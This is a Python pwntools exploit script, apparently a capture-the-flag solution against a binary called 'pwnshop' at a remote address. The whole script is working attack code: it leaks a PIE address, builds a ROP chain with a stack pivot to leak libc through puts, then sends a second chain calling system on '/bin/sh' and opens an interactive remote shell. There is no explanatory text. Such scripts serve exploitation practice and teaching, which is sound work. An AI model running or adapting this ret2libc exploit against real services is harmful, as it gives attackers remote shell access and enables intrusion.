from pwn import *

address = '94.237.53.117'
port = 47697

context.log_level = 'critical'
context.binary = binary = ELF('./pwnshop')
libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')
rop = ROP(binary)

pieOffset = 0x40c0

overflow = b'A' * 40

target = remote(address,port)

target.sendlineafter(b'> ', b'2')
target.sendlineafter(b'? ', b'pwned')
target.sendlineafter(b'? ', b'A' * 8)
target.recvuntil(b'A' * 8)

leakedAddress = u64(target.recvline().split(b'?')[0].ljust(8, b'\x00'))
print(f'Leaked PIE address: {hex(leakedAddress)}')

binary.address = leakedAddress - pieOffset
print(f'PIE Base: {hex(binary.address)}')

puts_plt = binary.plt.puts
puts_got = binary.got.puts
main = binary.address + 0x10a0

sub_rsp = binary.address + 0x1219
pop_rdi = binary.address + 0x13c3
ret = binary.address + 0x101a

leakPayload = overflow
leakPayload += p64(pop_rdi)
leakPayload += p64(puts_got)
leakPayload += p64(puts_plt)
leakPayload += p64(main)
leakPayload += b'A' * (72 - len(leakPayload))
leakPayload += p64(sub_rsp)

target.sendlineafter(b'> ', b'21')
target.sendlineafter(b'Enter details: ', leakPayload)

puts_libc = u64(target.recvline().strip().ljust(8, b'\x00'))
print(f'puts LIBC: {hex(puts_libc)}')

libc.address = puts_libc - libc.symbols.puts
print(f'LIBC Base: {hex(libc.address)}')

system = libc.symbols.system
binSh = libc.address + 0x18ce17

exploitPayload = overflow
exploitPayload += p64(pop_rdi)
exploitPayload += p64(binSh)
exploitPayload += p64(ret)
exploitPayload += p64(system)
exploitPayload += b'A' * (72 - len(exploitPayload))
exploitPayload += p64(sub_rsp)

target.sendlineafter(b'> ', b'21')
target.sendlineafter(b'Enter details: ', exploitPayload)

target.interactive()
